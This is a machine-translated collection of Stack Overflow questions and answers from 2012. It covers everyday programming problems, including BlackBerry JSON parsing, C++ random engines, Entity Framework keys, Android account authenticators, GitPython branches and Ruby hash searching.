> 标签：blackberry, blackberry-simulator, blackberry-eclipse-plugin

我是黑莓新手，我不知道如何在黑莓中使用矢量存储数据。我需要存储这些数据，所以请帮助我。

```
{
    "menu": {
        "id": "Home",
        "menuitem": [
            {
                "type": "form",
                "name": "Order",
                "url": "http://domain/oredr.aspx",
                "Row": [
                    {
                        "Index": "1",
                        "Control": [
                            {
                                "type": "LB",
                                "align": "Left",
                                "send": "No",
                                "value": "User Name",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "TB",
                                "align": "Right",
                                "send": "Yes",
                                "value": "",
                                "param": "username",
                                "maxlength": "25",
                                "ctype": "Alpha"
                            }
                        ]
                    }, {
                        "Index": "2",
                        "Control": [
                            {
                                "type": "LB",
                                "align": "Left",
                                "send": "No",
                                "value": "Mobile No",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "TB",
                                "align": "Right",
                                "send": "Yes",
                                "value": "",
                                "param": "MobileNo",
                                "maxlength": "10",
                                "ctype": "Numeric"
                            }
                        ]
                    }, {
                        "Index": "3",
                        "Control": [
                            {
                                "type": "LB",
                                "align": "Left",
                                "send": "No",
                                "value": "Email ID",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "TB",
                                "align": "Right",
                                "send": "Yes",
                                "value": "",
                                "param": "email",
                                "maxlength": "50",
                                "ctype": "Email"
                            }
                        ]
                    }, {
                        "Index": "4",
                        "Control": [
                            {
                                "type": "None",
                                "align": "Left",
                                "send": "No",
                                "value": "",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "BT",
                                "align": "Center",
                                "send": "No",
                                "value": "Submit",
                                "param": "",
                                "maxlength": "",
                                "ctype": "Submit"
                            }
                        ]
                    }
                ]
            }, {
                "type": "form",
                "name": "Stock",
                "url": "http://domain/stock.aspx",
                "Row": [
                    {
                        "Index": "1",
                        "Control": [
                            {
                                "type": "LB",
                                "align": "Left",
                                "send": "No",
                                "value": "Select Medium",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "CB",
                                "align": "Right",
                                "send": "Yes",
                                "value": "Select Medium",
                                "param": "medium",
                                "maxlength": "",
                                "ctype": "",
                                "Item": [
                                    {
                                        "name": "Yes"
                                    }, {
                                        "name": "No"
                                    }
                                ]
                            }
                        ]
                    }, {
                        "Index": "2",
                        "Control": [
                            {
                                "type": "None",
                                "align": "Left",
                                "send": "No",
                                "value": "",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "BT",
                                "align": "Center",
                                "send": "No",
                                "value": "Submit",
                                "param": "",
                                "maxlength": "",
                                "ctype": "Submit"
                            }
                        ]
                    }
                ]
            }, {
                "type": "form",
                "name": "Custom",
                "url": "http://domain/custom.aspx",
                "Row": [
                    {
                        "Index": "1",
                        "Control": [
                            {
                                "type": "LB",
                                "align": "Left",
                                "send": "No",
                                "value": "Offer Type",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "DD",
                                "align": "Right",
                                "send": "Yes",
                                "value": "",
                                "param": "offertype",
                                "maxlength": "",
                                "ctype": "",
                                "Item": [
                                    {
                                        "name": "Marketing"
                                    }, {
                                        "name": "Promotional"
                                    }
                                ]
                            }
                        ]
                    }, {
                        "Index": "2",
                        "Control": [
                            {
                                "type": "None",
                                "align": "Left",
                                "send": "No",
                                "value": "",
                                "param": "",
                                "maxlength": "",
                                "ctype": ""
                            }, {
                                "type": "BT",
                                "align": "Center",
                                "send": "No",
                                "value": "Submit",
                                "param": "",
                                "maxlength": "",
                                "ctype": "Submit"
                            }
                        ]
                    }
                ]
            }
        ]
    }
} 
```

我正在解析成功使用 json 解析器。

```
try {
        JSONObject root = new JSONObject(Data.data).getJSONObject("menu");
        JSONArray array = root.getJSONArray("menuitem");

    System.out.println("strMenu=="+strMenu);
    for(int loop=0; loop<array.length(); loop++){
        System.out.println(array.getJSONObject(loop).get("type"));
        System.out.println(array.getJSONObject(loop).get("name"));
        System.out.println(array.getJSONObject(loop).get("url"));
        JSONArray rows = array.getJSONObject(loop).getJSONArray("Row");
        for(int innerLoop=0; innerLoop<rows.length();innerLoop++){
            System.out.println(rows.getJSONObject(innerLoop).get("Index"));
            JSONArray controll = rows.getJSONObject(innerLoop).getJSONArray("Control");
            for(int innermostLoop =0; innermostLoop<controll.length(); innermostLoop++){
                System.out.println(controll.getJSONObject(innermostLoop).get("type"));
                System.out.println(controll.getJSONObject(innermostLoop).get("align"));
                System.out.println(controll.getJSONObject(innermostLoop).get("send"));
                System.out.println(controll.getJSONObject(innermostLoop).get("value"));
                System.out.println(controll.getJSONObject(innermostLoop).get("param"));
                System.out.println(controll.getJSONObject(innermostLoop).get("maxlength"));
                System.out.println(controll.getJSONObject(innermostLoop).get("ctype"));

                if(controll.getJSONObject(innermostLoop).get("type").equals("DD"))
                {
                    JSONArray item=controll.getJSONObject(innermostLoop).getJSONArray("Item");
                    for(int i=0;i<item.length();i++)
                    {
                        System.out.println(item.getJSONObject(i).get("name"));
                    }

                }

            }
        }
    }
} catch (Exception e) {
    e.printStackTrace();
    System.out.println("ZZZZZZZZ error ZZZZZZZ");
    // TODO: handle exception
} 
```

我想将所有数据存储在一个向量中。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:42:44.420

尝试这个 -

```
Vector vector = new Vector(); 
```

在您的 for 循环中，将项目添加到向量中。

```
vector.addElement(new your_object(value_1,value_2......)); 
```

# c++ - 如何重置随机数引擎？

> ID：10991607
> 
> 赞同：13
> 
> 时间：2012-06-12T06:38:19.060
> 
> 标签：c++, random, c++11

我正在尝试使用 C++11 方法生成随机数：

```
#include <random>
#include <functional>
#include <iostream>

int main(int argc, char *argv[])
{    
    std::normal_distribution<double> normal(0, 1);
    std::mt19937 engine; // Mersenne twister MT19937
    auto generator = std::bind(normal, engine);

    int size = 2;

    engine.seed(0);
    normal.reset();
    for (int i = 0; i < size; ++i)
        std::cout << generator() << std::endl;

    std::cout << std::endl;

    engine.seed(1);
    normal.reset();
    for (int i = 0; i < size; ++i)
        std::cout << generator() << std::endl;

    std::cout << std::endl;

    engine.seed(0);
    normal.reset();
    for (int i = 0; i < size; ++i)
        std::cout << generator() << std::endl;

    return 0;
} 
```

输出是：

```
0.13453
-0.146382

0.46065
-1.87138

0.163712
-0.214253 
```

这意味着第一个和第三个序列并不相同，即使它们以相同的编号作为种子。请问，我做错了什么？是个

```
std::normal_distribution<double> 
```

只是数学意义上的一个函数（确定性地从 x 中产生 y）还是我遗漏了什么？如果只是一个函数，那么reset方法实际上是做什么的呢？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-12T06:47:28.053

您正在绑定引擎和分发，因此以下重置调用不会影响绑定功能。

解决方案是将引用绑定到引擎和发行版

```
auto generator = std::bind(std::ref(normal), std::ref(engine)); 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-06-12T06:48:09.070

您遇到的问题是`std::bind`. `std::bind`复制其论点。之所以`std::bind`进行复制，是因为将来当参数可能不再存在时，该函数将在某个未知时间点被调用。`engine.seed()`这意味着您对等的调用是无用的。使用`std::ref`您可以通过引用绑定您的参数，这将为您提供预期的输出。

```
auto generator = std::bind(std::ref(normal), std::ref(engine)); 
```

# php - wordpress 用户管理用户特定页面

> ID：10991613
> 
> 赞同：0
> 
> 时间：2012-06-12T06:38:48.427
> 
> 标签：php, wordpress, user-management

我想创建我想在其中创建用户管理的 wordpress 网站...

这意味着只有具有特定角色的注册用户才能看到我网站的受限页面，访问者只能看到公共页面。用户还可以查看/编辑他/她的个人资料...

我也想为它创建登录功能，但我认为插件是可用的......

如果有任何插件可用，或者我如何开发相同的代码，请建议我......

谢谢，
马赫什

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:47:36.903

检查此插件链接，我认为此插件中提供了大多数请求的功能。您还可以从此链接查看插件列表 - [http://www.webdesignlessons.com/7-user-management-plugins-for-wordpress/](http://www.webdesignlessons.com/7-user-management-plugins-for-wordpress/)

插件 URL - [http://wordpress.org/extend/plugins/user-access-manager/](http://wordpress.org/extend/plugins/user-access-manager/)

# c# - 修改 PK 以保存到 EF4 中的数据库

> ID：10991615
> 
> 赞同：1
> 
> 时间：2012-06-12T06:38:49.283
> 
> 标签：c#, .net-4.0, entity-framework-4

我们即将将具有自己持久性 objectMngr 的旧应用程序移动到新的实体框架，这工作正常。问题是旧的 ObjectMngr 过去常常将主键作为字符串，有时以自己的格式保存，现在为了实现兼容的持久性，我需要将 EF 配置为使用相同的格式，或者最终修改实体 PK 的保存.

我假设这是可能的，有人知道我在哪里可以做到吗？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:03:23.800

您需要将`StoreGeneratedPattern`主键属性设置为`None`. 之后，您可以使用您在旧解决方案中使用的相同代码自己分配主键值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-14T12:24:04.430

这个问题在 Stackoverflow 上被问了好几次。请阅读此回复：[Entity Framework 4 Code First 是否支持 NHibernate 等身份生成器？](https://stackoverflow.com/questions/5275306/does-entity-framework-4-code-first-have-support-for-identity-generators-like-nhi)

它解决了您描述的问题。如果您不像您的情况那样使用代码优先方法，则覆盖从 ObjectContext 继承的生成类中的 SaveChanges 方法。DbContext 类仅用于 Code First 方法。例如：

```
public interface IEntity
{
    string Id { get; set; }
}

public partial class MyEntity: IEntity
{
}

public partial class MyEntities
{
    public override int SaveChanges(System.Data.Objects.SaveOptions options)
    {
        var generator = new IdGenerator();

        foreach(var entry in this.ObjectStateManager.GetObjectStateEntries(EntityState.Added))
        {
            var entity = entry.Entity as IEntity;
            if (entity != null)
            {
                entity.Id = generator.CreateNewId();
            }
        }

        return base.SaveChanges(options);
    }
} 
```

此示例假设您`IEntity`为模型中的所有类（如`MyEntity`）实现，这取决于 PK 的特殊生成，并且`MyEntities`是`ObjectContext`. `IdGenerator`应该提供您提供主键的方法。此代码还要求该属性`Id`位于生成的代码中。

# php - 空格和头部标签显示在正文中？

> ID：10991617
> 
> 赞同：1
> 
> 时间：2012-06-12T06:38:59.980
> 
> 标签：php, cakephp

我在cakephp中完全在法国网站上工作，但它导致文件类型编码将字符嵌入到html中。所以我将文件类型更改为`encode in utf-8`notepad ++。但它导致问题并在html正文中给出空格和head标签-

```
&#65279;
<meta content="IE=EmulateIE9" http-equiv="X-UA-Compatible">
<meta content="IE=EmulateIE8" http-equiv="X-UA-Compatible">
<title> : test</title>
<link rel="icon" type="image/x-icon" href="/mapubvideoRel/favicon.ico">
<link rel="shortcut icon" type="image/x-icon" href="/mapubvideoRel/favicon.ico">
<link href="/mapubvideoRel/css/main.css" type="text/css" rel="stylesheet">
<link href="/mapubvideoRel/css/helper.css" type="text/css" rel="stylesheet">
<link href="/mapubvideoRel/css/general.css" type="text/css" rel="stylesheet">
<link href="/mapubvideoRel/css/colorbox.css" type="text/css" rel="stylesheet">
<link href="/mapubvideoRel/css/App_Popup.css" type="text/css" rel="stylesheet">
<script src="/mapubvideoRel/js/jquery.js" type="text/javascript">
<script src="/mapubvideoRel/js/popup.js" type="text/javascript">
<script src="/mapubvideoRel/js/jquery.colorbox-min.js" type="text/javascript">

&#65279; 
```

请帮忙。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-13T08:13:37.793

你有 BOM char 的文件。使用 BOM Detector 程序

java : [http://www.javapractices.com/topic/TopicAction.do?Id=257](http://www.javapractices.com/topic/TopicAction.do?Id=257) [推荐][查找并删除]

1- 检查 URL 是否存在 BOM
2- 从文件
php 中删除 BOM：http: [//www.dotvoid.com/2010/04/detecting-utf-bom-byte-order-mark/](http://www.dotvoid.com/2010/04/detecting-utf-bom-byte-order-mark/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-01T19:20:09.467

我在我的 MVC6 Web 应用程序中也遇到了这个问题。

我在最顶部的布局页面中添加了以下行，问题已解决。

```
<?xml version="1.0" encoding="UTF-8" ?> 
```

# wso2 - HTTP POST 和 WSO2ESB

> ID：10991619
> 
> 赞同：0
> 
> 时间：2012-06-12T06:39:00.183
> 
> 标签：wso2, wso2esb

好吧，我知道这可能是个愚蠢的问题。但是我在网上搜索过，有些人怎么不能回答这个简单的问题。切入正题：如何在 wso2 esb 中处理 http post 请求。有人可以给我一个例子来说明处理http post请求的代理服务的实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:59:04.290

您不必为 POST 请求专门配置任何内容。您唯一需要考虑的是请求和响应的内容类型。并且基于该内容类型，您必须在axis2.xml 中使用适当的消息生成器和格式化程序。

如果您发现任何问题，请提供发送到 ESB 的 HTTP POST 请求和服务接受的响应（包含所有 HTTP 内容类型等）

# algorithm - 检测重复的线组

> ID：10991624
> 
> 赞同：0
> 
> 时间：2012-06-12T06:39:41.430
> 
> 标签：algorithm, compression

我有几兆字节的数据，如下所示：

```
11  2  1
 4  3  1
11  2  1
 4  3  1
11  2  1
 4  3  1
18  3  2 
```

我想通过添加“前 n 行重复 m 次”的行来压缩它。该算法应该读取行并延迟打印它们，直到找到可能的最长 m*n，但可以假设 n<=10。最好的方法是什么？

我正在考虑只保留 10 个数组，其中包含 1..10 个前行和重复计数器，在新行进入时旋转数组内容，并在新读取的行与任何数组中最旧的条目不匹配时打印上述消息，并且至少有一个数组被重复填充。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:11:43.960

zip 算法可以保持数据的可读性。他们只是创建重复元素的字典（例如，看看[lempel - ziv](http://en.wikipedia.org/wiki/LZ77)）。我认为您描述的算法可能有问题。您的第二行与第一行不同，那么您怎么知道应该将它们视为一个群体？你什么时候限制组，开始一个新的？
你怎么能这么说

```
11 2 1
4 3 1 
```

真的属于同一组吗？

我认为 lempel ziv 可以为您解决这个问题，它有一本字典，其中包括所有可能的子集及其出现次数。在您的字典中，您将有子集，例如

```
11 2 1
4 3 1
11 2 1 
```

但是，如果您以某种方式知道重复行将成对或三胞胎出现，则可以限制算法中检查的子集，并将字典中的子集保持在您的预期长度。
这样，最终您的字典将如下所示：

```
key          : count
11 2 1       : 3
4  3 1       : 3
11 2 1, 4 3 1: 3
18 3 2       : 1 
```

当然，它需要更多的调整，但我认为这个算法应该是大方向

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T16:06:52.043

“复制前 n 行重复 m 次”是“从 j 行向后复制 k 行”的受限版本。第一个是第二个，k = n * m 和 j = n。更通用的 k,j 版本是 LZ77。（虽然通常它是字节而不是行。）

LZ77 算法可以很好地解决这个问题。gzip、zlib 等使用的哈希表方法快速且易于编码。首先，定义您认为值得的 k (mink) 的最小值，并定义您想要查找匹配项的距离，即 j (maxj) 的最大值。然后构造一个 maxj 行的滑动窗口进行搜索。

随着每一行的到来，更新一个仅依赖于最后一个貂行的哈希。在哈希表中查找与该哈希匹配的最后一行，然后将您的行直接与滑动窗口中的内容进行比较，直到它们不匹配为止。然后，如果得到的长度是 mink 或更多，你就有一个匹配，它由一个长度和一个距离（k 和 j）组成。

使用惰性匹配，将匹配的发射推迟到处理下一行，这可能会产生更长的匹配。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T08:18:39.303

如果您将文件视为长字符串，那么我认为您的问题在于找到[最长的重复子字符串](http://en.wikipedia.org/wiki/Longest_repeated_substring_problem)

# mysql - MySQL查询不起作用

> ID：10991625
> 
> 赞同：1
> 
> 时间：2012-06-12T06:39:43.023
> 
> 标签：mysql, ruby-on-rails

在我的网站上，用户有一个“待办事项”列表。在测验中获得最低成就后，该测验将从用户的待办事项中删除。下面的代码适用于产品，但不适用于通过“BusinessRelationship”列出的任何测验。

```
def not_quizzed_things
   taken_company_ids = quizzes_taken.select{|q| q.thing_type == 'BusinessRelationship'}.map{|q| q.thing_id}.uniq
   conds = "business_relationships.from_company_id = ? and (business_relationships.legit_quiz_questions_count + c.legit_quiz_questions_count) > 0"
   args = [company_id]
   unless taken_company_ids.blank?
     conds += " and c.id not in (?)"
     args << taken_company_ids
  end

  quiz_companies = BusinessRelationship.find(:all, :joins => "join companies c on c.id = business_relationships.to_company_id", :conditions => [conds]+args, :order => "id", :limit => 0)
  quiz_companies = [company] + quiz_companies unless company.legit_quiz_questions_count <= 0 || quizzes_taken.select{|q| q.thing_type == 'Company'}.map{|q| q.thing}.include?(company)
  n = 20 - quiz_companies.size

  taken_products_retailer_ids = quizzes_taken.select{|q| q.thing_type == 'ProductsRetailer'}.map{|q| q.thing_id}.uniq
  conds = "products_retailers.company_id = ? and (p.legit_quiz_questions_count + products_retailers.legit_quiz_questions_count) > 0"
  args = [company_id]
  unless taken_products_retailer_ids.blank?
    conds += " and products_retailers.id not in (?)"
    args << taken_products_retailer_ids
  end
quiz_products_retailers = ProductsRetailer.find(:all, :joins => "join products p on p.id = products_retailers.product_id", :conditions => [conds]+args, :order => "id", :limit => n)
quiz_companies + quiz_products_retailers
end 
```

控制台结果：

```
ruby-1.8.7-p352 :007 > y u.quizzes_taken.last
--- !ruby/object:Quiz 
attributes: 
  thing_id: "213"
  created_at: 2012-06-09 20:07:32
  end_time: 2012-06-09 20:07:56
  current_attempt_id: 
  thing_type: BusinessRelationship
  updated_at: 2012-06-09 20:07:56
  order: "2388,2389,2390,2391"
  id: "467"
  correct_count: "4"
  user_id: "392"
  attempt_count: "4"
  start_time: 2012-06-09 20:07:32
attributes_cache: {} 
```

任何想法或建议都非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T07:10:14.457

我会查看您的调试窗口以查看发送到数据库的确切 SQL，并查看为什么您的查询未按预期输出。从您的数据库返回到您的代码。

# symfony1 - 如果一个页面中有两个规范标签会发生什么？

> ID：10991634
> 
> 赞同：0
> 
> 时间：2012-06-12T06:40:53.480
> 
> 标签：symfony1, seo, duplicate-removal, canonical-link

我正在尝试为文章添加规范结构，因为 Google 假设我正在复制内容。

我正在使用 symfony 1.0.6，成功页面包含在布局中，并且布局有自己的规范标签。我在成功页面中动态添加另一个规范标签，它导致多个规范标签。

我无法从布局中删除规范标签，因为它将被许多其他模板使用。

我需要删除来自布局的规范标签，并仅为少数模板（动态）插入我自己的标签。

有没有可能实现。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T17:17:41.830

通常在这种情况下，您将链接的标记分隔在一个模板中，该模板包括根据它们被包含的位置修改链接属性的逻辑。稍微看一下[这篇文章](http://fabien.potencier.org/article/34/templating-engines-in-php)，看看更多模板引擎的例子。

希望这可以帮助

# android - 没有帐户时，Android Authenticator 启动登录屏幕

> ID：10991635
> 
> 赞同：5
> 
> 时间：2012-06-12T06:41:06.180
> 
> 标签：android, android-syncadapter, android-authenticator

我已经构建了一个 Authenticator，我已经构建了一个 SyncAdapter（两者都可以通过模拟器上的设置手动执行）。

如果未找到帐户，如何在应用程序启动时让我的应用程序启动登录屏幕（addAccount 方法）？

这是我的 Manifest.xml ......

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.lateral.myapp"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk android:minSdkVersion="8" android:targetSdkVersion="14"/>

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS"/>
    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS"/>
    <uses-permission android:name="android.permission.USE_CREDENTIALS"/>    
    <uses-permission android:name="android.permission.READ_SYNC_STATS" />
    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />

    <application android:icon="@drawable/icon" android:label="@string/app_name" android:name=".myappApplication">
        <activity android:name=".ui.EventListActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>

                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".authenticator.AccountAuthenticatorService" android:exported="true" android:process=":auth">
            <intent-filter>
                <action android:name="android.accounts.AccountAuthenticator"/>
            </intent-filter>
            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator"/>
        </service>

        <service android:name="sync.EventsSyncAdapterService" android:exported="true" android:process=":events">
            <intent-filter>
                <action android:name="android.content.SyncAdapter" />
            </intent-filter>
            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/sync_events" />
        </service>

        <activity android:excludeFromRecents="true" android:name=".authenticator.myappAuthenticatorActivity">
            <!--
                No intent-filter here! This activity is only ever launched by
                someone who explicitly knows the class name
            -->
        </activity>
    </application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T06:44:46.197

不通过`AccountManager`工作？就像是：

```
 AccountManager accountManager = AccountManager.get(this);
 Account[] accounts = accountManager.getAccountsByType("myCustomAccount");
 if (accounts.length == 0) {
    accountManager.addAccount("myCustomAccount", null, null, null, this,
                               null, null);
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:46:19.947

在您的“EventListActivity”onCreate 中，检查是否有任何帐户。如果没有，请打开 Authenticator 活动。如果你想让它检查并显示 Authenticator，在 EventListActivity 的 UI 显示之前，你所要做的就是在 onCreate 方法中的“setContentView”之前添加代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-05T07:28:07.743

检查帐户是否存在，如果没有进入登录屏幕。

```
public static boolean accountExists(Context ctx, AccountManager accountManager) {
Account[] accounts = accountManager.getAccountsByType(
  ctx.getString(R.string.account_type)
);
return accounts.length > 0;
} 
```

# python - 使用 GitPython 模块获取远程 HEAD 分支

> ID：10991639
> 
> 赞同：8
> 
> 时间：2012-06-12T06:41:40.357
> 
> 标签：python, git, gitpython

我正在尝试使用 GitPython 编写一些 Python 脚本，当我管理许多分支时，我可以使用它来简化我的日常任务。

在编写复杂的脚本时，我对 Python 也很陌生。

这是我使用的 API：[GitPython API doc](http://packages.python.org/GitPython/0.3.2/index.html)

我想用 GitPython 编写它，它只执行以下操作并解析出显示 HEAD 远程分支指向的部分。换句话说，我想基本上得到`remotes/origin/HEAD`

```
$ git branch -a
  master
* branch_to_remove
  remotes/origin/HEAD -> origin/master
  remotes/origin/master
  remotes/origin/testing 
```

我多次浏览 API 文档，起初我无法理解这些 API 文档的 Python 格式，除了`remote_head`在`class git.refs.reference.Reference(repo, path, check_path=True)`

但我什至不知道如何调用/初始化它。

这是我到目前为止所做的，你可以告诉我我正在尝试做什么，只需重置为“无分支”状态并删除我所在的当前分支：

```
import git
from git import *
repo = git.Repo("/some/path/testing")
repo.git.branch()
[some code to get the remotes/origin/HEAD, set it to remoteHeadBranch ]
repo.git.checkout(remoteHeadBranch)  # this should reset the Git back to 'no branch' state
repo.git.checkout(D="branch_to_remove") 
```

任何帮助深表感谢！

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T07:24:24.333

我刚刚看到你的问题，我想知道这个 gitPython，看起来非常不错的工具，我一直在 GitPython 文档中寻找这个特定的问题，但没有幸运，但如果你在 github 上搜索，你会在那里看到很多测试，并且有一个对此进行测试。

当您搜索“删除新分支”时，您会看到如下内容：

```
# remove new branch
Head.delete(new_remote_branch.repo, new_remote_branch) 
```

[GitPython 参考](https://github.com/gitpython-developers/GitPython/blob/master/git/test/test_remote.py)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-04-17T03:29:45.870

要打印当前分支：

```
print(repo.head.ref) 
```

列出分支

```
print [str(b) for b in repo.heads] 
```

结帐分支

```
repo.heads[branch].checkout() 
```

或者`repo.git.checkout(branch)`

如果您尝试删除一个分支，您需要位于不同的 LOCAL 分支中，您可以通过多种方式执行此操作

```
repo.heads['master'].checkout() 
```

或`repo.git.checkout('master')` 或`repo.git.checkout('remotes/origin/master')`

希望这可以帮助

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-09-30T07:42:54.673

`next(ref for ref in repo.remotes.origin.refs if ref.name == "origin/HEAD").ref.name`

`repo.remotes.origin.refs`会给你一个远程分支的列表。过滤*HEAD*并检查它指向的内容（ref<.name>）。

你现在剩下类似`"origin/master"`or的东西`"origin/main"`。

# jquery - Rails 3嵌套模型表单创建重复的模型对象

> ID：10991640
> 
> 赞同：2
> 
> 时间：2012-06-12T06:41:42.477
> 
> 标签：jquery, ruby-on-rails-3, nested-forms

我按照 Ryan Bates 的教程（[第 196 集 - 嵌套模型表单（修订版）](http://railscasts.com/episodes/196-nested-model-form-revised)）为模型创建了一个表单（`Employee`）和嵌套`has_many :through`模型（`Capability`）。在大多数情况下它都有效；但是，当我单击链接以将新模型对象添加到表单时，会创建并插入*两个。*我不知道为什么-我已经为此苦苦挣扎了几个晚上，但无法解决。谁能指出我哪里出错了？

（`Capability`这里代表一个`has_many through`关联：）`Employee has_many :roles, through: :capabilities`。

### 形成部分

```
<%= form_for(@employee) do |f| %>

  # Employee fields here ...

  <%= f.fields_for :capabilities do |builder| %>
    <%= render 'capability_fields', f: builder %>
  <% end %>
  <%= link_to_add_fields "Add capability", f, :capabilities %>

  <%= f.submit "Submit", :class => 'submit' %>
<% end %> 
```

### 能力字段部分

```
<fieldset>
  <%= f.select :role_id, Role.all.collect{ |r| [r.name, r.id]} %>
  <%= f.check_box :primary_role_flag %>
  <%= f.text_field( :valid_from, :class => 'date') %>
  <%= f.text_field( :expires_on, :class => 'date') %>
  <%= f.hidden_field :_destroy %>
  <%= link_to "Remove", '#', class: "remove_fields" %>
</fieldset> 
```

### link_to_add_fields 应用程序助手

```
def link_to_add_fields(name, f, association)
  new_object = f.object.send(association).klass.new
  id = new_object.object_id
  fields = f.fields_for(association, new_object, child_index: id) do |builder|
    render(association.to_s.singularize + "_fields", f: builder)
  end
  link_to(name, '#', class: "add_fields", data: {id: id, fields: fields.gsub('\n','&#xA')})
end 
```

### jQuery 咖啡脚本

```
jQuery ->
  $('form').on 'click', '.remove_fields', (event) ->
    $(this).prev('input[type=hidden]').val('1')
    $(this).closest('fieldset').hide()
    event.preventDefault()

  $('form').on 'click', '.add_fields', (event) ->
    time = new Date().getTime()
    regexp = new RegExp($(this).data('id'), 'g')
    $(this).before($(this).data('fields').replace(regexp, time))
    event.preventDefault() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T23:20:57.537

这可能无济于事，但在我的情况下，问题似乎可以追溯到[Decent Exposure](https://github.com/voxdolo/decent_exposure) gem。

**编辑：**好的，看起来这是我的错，而不是体面的曝光。我使用以下方法明确设置属性：

```
gallery.attributes = params[:gallery] 
```

我这样做是因为我需要在保存记录之前检查权限。只是事实证明，体面的曝光已经在为我做这件事。因此，造成重复。我知道这可能无法解决您的问题，但是我所要做的就是从控制器中删除该行，一切正常。

我希望至少能给你一些关于看什么的想法。

# ruby - 在 Ruby 中使用部分哈希搜索哈希数组

> ID：10991647
> 
> 赞同：1
> 
> 时间：2012-06-12T06:42:32.600
> 
> 标签：ruby

给定一个哈希

```
z = [{'a' => 1, 'b' => 2}, {'a' => 3, 'b' => 4}, {'a' => 1, 'b' => 4}] 
```

如果搜索参数本身是散列，我该如何搜索，例如

```
{'a' => 3} 
```

这样我就可以做类似 z.find_by_hash({'a' => 3}) 的事情让它返回

```
{'a' => 3, 'b' => 4} 
```

并且还得到一个数组集合，比如 z.find_by_hash({'a' => 1}) 让它返回

```
[{'a' => 1, 'b' => 2}, {'a' => 1, 'b => 4}] 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:20:26.773

你可以这样做：

```
class Array
  def find_by_hash(hash)
    self.select { |h| h.includes_hash?(hash) }
  end
end

class Hash
  def includes_hash?(other)
    included = true

    other.each do |key, value|
      included &= self[key] == other[key]
    end

    included
  end
end 
```

这`Hash`通过一种方法扩展，以确定 a 是否`Hash`包含另一个（具有多个键和值）。`Array`使用您想要的方法进行扩展，但它是一种更通用的方法，因为您可以这样做：

```
ary = [ {:a => 1, :b => 3, :c => 5}, {:a => 5, :b => 2, :c => 8} ]
ary.find_by_hash( { :a => 1, :c => 5 } ) 
```

注意：您还应该考虑使用`Symbol`s 作为`Hash`键，因为这是 Ruby 中的常见做法，但我的方法也适用于您的键。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T07:04:16.230

```
z = [{'a' => 1, 'b' => 2}, {'a' => 3, 'b' => 4}, {'a' => 1, 'b' => 4}]

class Array
  def search_hash(hash)
    key = hash.keys.first
    value = hash.values.first
    select { |h| h[key] == value }
  end
end

z.search_hash({'a' => 3}) #=> [{"a"=>3, "b"=>4}] 
```

或者您可以在没有大括号的情况下键入它

```
z.search_hash('a' => 3) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T07:11:06.337

基本上你需要的是这样的：

```
class Array
  def find_by_hash(h)
    h.collect_concat  do |key, value| 
      self.select{|h| h[key] == value}
    end
  end 
end 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T07:15:30.883

我没有在 API 中找到方法，所以我认为我们必须自己实现它。
（顺便说一句，我认为@megas 的方法更好，更易读）

TDD 代码：

```
class SearchHashTest < Test::Unit::TestCase
  def setup
    @array_with_hash_elements = ArrayWithHashElements.new [{'a' => 1, 'b' => 2}, {'a' => 3, 'b' => 4}, {'a' => 1, 'b' => 4}]
  end
  def test_search_an_array_by_hash_parameter_and_return_single_hash
    assert_equal( {'a' => 3, 'b' => 4}, @array_with_hash_elements.search({'a'=>3}) )
  end
  def test_search_an_array_by_hash_parameter_and_return_an_array
    assert_equal( [{'a' => 1, 'b' => 2}, {'a'=> 1, 'b' => 4}], @array_with_hash_elements.search({'a'=>1}))
  end
end 
